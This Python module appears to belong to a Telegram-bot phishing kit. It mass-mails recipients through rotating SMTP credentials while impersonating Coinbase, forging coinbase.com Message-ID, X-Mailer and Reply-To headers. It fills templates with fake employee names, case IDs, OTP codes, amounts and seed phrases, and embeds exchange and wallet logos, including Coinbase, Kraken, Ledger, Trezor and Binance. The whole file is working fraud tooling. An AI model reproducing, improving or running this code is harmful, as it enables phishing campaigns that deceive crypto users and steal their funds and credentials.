"""Email sending functionality"""
import asyncio
import datetime
import smtplib
import ssl
import random
import string
import html2text
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.utils import formataddr
from logger_config import logger
import os

def generate_random_code(length=6):
    """Generate a random numeric code"""
    return ''.join(random.choices(string.digits, k=length))

def generate_random_amount():
    """Generate random crypto amount"""
    amounts = ["529.75", "1,820", "2,450.50", "892.25", "3,150", "675.80", "1,245.90"]
    return random.choice(amounts)

def generate_random_reference():
    """Generate random reference code"""
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

def generate_seed_phrase():
    """Generate random seed phrase"""
    seed_words = [
        "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
        "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
        "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit",
        "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "against", "age",
        "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol",
        "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also",
        "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient"
    ]
    return " ".join(random.choices(seed_words, k=12))

def get_smtp_connection(smtp_config):
    """Get appropriate SMTP connection based on port"""
    hostname = smtp_config['hostname']
    port = smtp_config['port']
    username = smtp_config.get('username')
    password = smtp_config.get('password')

    try:  
        if port == 465:  
            # SSL connection (SMTPS)  
            context = ssl.create_default_context()  
            server = smtplib.SMTP_SSL(hostname, port, context=context)  
        elif port in [587, 25, 2525]:  
            # STARTTLS connection  
            server = smtplib.SMTP(hostname, port)  
            server.starttls()  # Secure the connection  
        else:  
            # Try regular connection first, then STARTTLS if available  
            server = smtplib.SMTP(hostname, port)  
            try:  
                server.starttls()  # Try to secure the connection  
            except smtplib.SMTPNotSupportedError:  
                pass  

        # 🔧 Modified here to check auth flag
        if smtp_config.get('auth', True):
            server.login(username, password)

        return server

    except Exception as e:  
        logger.error(f"SMTP connection error: {str(e)}")  
        return None

async def send_email_smtp(smtp_config, sender_name, sender_email, recipient_email, subject, html_content, plain_text_content):
    """Send email using SMTP with advanced headers and support for all ports"""
    try:
        otp_code = generate_random_code(6)
        current_date = datetime.datetime.now().strftime("%B %d, %Y")
        case_id = generate_random_code(7)
        amount = generate_random_amount()
        reference = generate_random_reference()
        seed_phrase = generate_seed_phrase()
        
        employee_names = [
            "Daniel Greene", "Sarah Johnson", "Michael Chen", "Emily Rodriguez", "James Wilson",
            "David Martinez", "Lisa Anderson", "Robert Taylor", "Jennifer Brown", "Christopher Lee",
            "Sarah Suarez", "Glenn Radars", "Alex Thompson", "Maria Garcia", "Kevin Park"
        ]
        employee = random.choice(employee_names)
        
        support_links = [
            "https://support.coinbase.com/verify",
            "https://help.coinbase.com/secure",
            "https://coinbase.com/support/access",
            "https://secure.coinbase.com/help"
        ]
        support_link = random.choice(support_links)

        replacements = {
            "{email}": recipient_email,
            "{code}": otp_code,
            "{otp}": otp_code,
            "{date}": current_date,
            "{case_id}": case_id,
            "{employee}": employee,
            "{emp}": employee,
            "{amount}": amount,
            "{reference}": reference,
            "{seed_phrase}": seed_phrase,
            "{link}": support_link,
            "{url}": support_link,
            "seed_placeholder": seed_phrase,
            "cid:logo": "https://static-assets.coinbase.com/email/coinbase-transactional-wordmark-blue.png",
            "{logo}": "https://static-assets.coinbase.com/email/coinbase-transactional-wordmark-blue.png"
        }
        
        html_custom = html_content
        text_custom = plain_text_content
        
        for placeholder, value in replacements.items():
            html_custom = html_custom.replace(placeholder, value)
            text_custom = text_custom.replace(placeholder, value)
          
        msg = MIMEMultipart('related')  
        msg['Subject'] = subject  
        msg['From'] = formataddr((sender_name, sender_email))  
        msg['To'] = recipient_email  
        msg['Message-ID'] = f"<{otp_code}.{int(datetime.datetime.now().timestamp())}@coinbase.com>"  
        msg['X-Mailer'] = "Coinbase Mailer/2.0"  
        msg['X-Priority'] = "3"  
        msg['Precedence'] = "bulk"  
        msg['List-Unsubscribe'] = f"<mailto:unsubscribe@coinbase.com?subject=unsubscribe>"  
        msg['Date'] = datetime.datetime.now().strftime("%a, %d %b %Y %H:%M:%S +0000")  
        msg['Return-Path'] = sender_email  
        msg['Reply-To'] = "noreply@coinbase.com"

        msg_alternative = MIMEMultipart('alternative')
        msg.attach(msg_alternative)
        
        part1 = MIMEText(text_custom, 'plain', 'utf-8')
        part2 = MIMEText(html_custom, 'html', 'utf-8')
        msg_alternative.attach(part1)
        msg_alternative.attach(part2)
        
        # Attach images based on content
        if "cid:logo" in html_content:
            try:
                # Try different logo paths based on template
                logo_paths = [
                    "templates/coinbase/coinbase.png",
                    "templates/kraken/kraken.png", 
                    "templates/ledger/ledwm.png",
                    "templates/trezor/trezor.png",
                    "templates/binance/binance.png"
                ]
                
                for logo_path in logo_paths:
                    if os.path.exists(logo_path):
                        with open(logo_path, 'rb') as f:
                            img_data = f.read()
                        image = MIMEImage(img_data)
                        image.add_header('Content-ID', '<logo>')
                        image.add_header('Content-Disposition', 'inline', filename=os.path.basename(logo_path))
                        msg.attach(image)
                        break
            except Exception as e:
                logger.error(f"Error attaching logo: {str(e)}")

        # Attach additional icons if needed
        if "cid:icon" in html_content:
            try:
                icon_path = "templates/kraken/kraken.png"
                if os.path.exists(icon_path):
                    with open(icon_path, 'rb') as f:
                        img_data = f.read()
                    image = MIMEImage(img_data)
                    image.add_header('Content-ID', '<icon>')
                    image.add_header('Content-Disposition', 'inline', filename='icon.png')
                    msg.attach(image)
            except Exception as e:
                logger.error(f"Error attaching icon: {str(e)}")

        server = get_smtp_connection(smtp_config)
        if not server:
            return False

        try:
            server.send_message(msg)
            return True
        finally:
            server.quit()

    except Exception as e:
        logger.error(f"Email sending error: {str(e)}")
        return False

async def process_email_campaign(context, update, status_message):
    from file_manager import load_smtp_credentials

    smtp_configs = load_smtp_credentials()
    if not smtp_configs:
        await update.message.reply_text("Error: SMTP credentials not found or invalid. Please check smtp.txt file.")
        return None

    successful = 0
    failed = 0
    smtp_index = 0

    start_time = datetime.datetime.now()
    total_emails = len(context.user_data['mailist'])
    delay = context.user_data['delay']

    for i, recipient in enumerate(context.user_data['mailist']):
        try:
            current_smtp = smtp_configs[smtp_index % len(smtp_configs)]
            smtp_index += 1

            result = await send_email_smtp(
                smtp_config=current_smtp,
                sender_name=context.user_data['sender_name'],
                sender_email=context.user_data['sender_email'],
                recipient_email=recipient,
                subject=context.user_data['subject'],
                html_content=context.user_data['content'],
                plain_text_content=context.user_data['plain_text_content']
            )

            if result:
                successful += 1
            else:
                failed += 1

            if (i + 1) % 10 == 0 or i == total_emails - 1:
                elapsed = datetime.datetime.now() - start_time
                elapsed_str = str(elapsed).split('.')[0]

                await status_message.edit_text(
                    f"Progress: {i+1}/{total_emails} emails processed\n"
                    f"✅ Successful: {successful}\n"
                    f"❌ Failed: {failed}\n"
                    f"⏱️ Elapsed time: {elapsed_str}"
                )
        except Exception:
            failed += 1

        await asyncio.sleep(delay)

    end_time = datetime.datetime.now()
    total_time = end_time - start_time
    total_time_str = str(total_time).split('.')[0]

    return {
        'successful': successful,
        'failed': failed,
        'total_time': total_time_str
    }
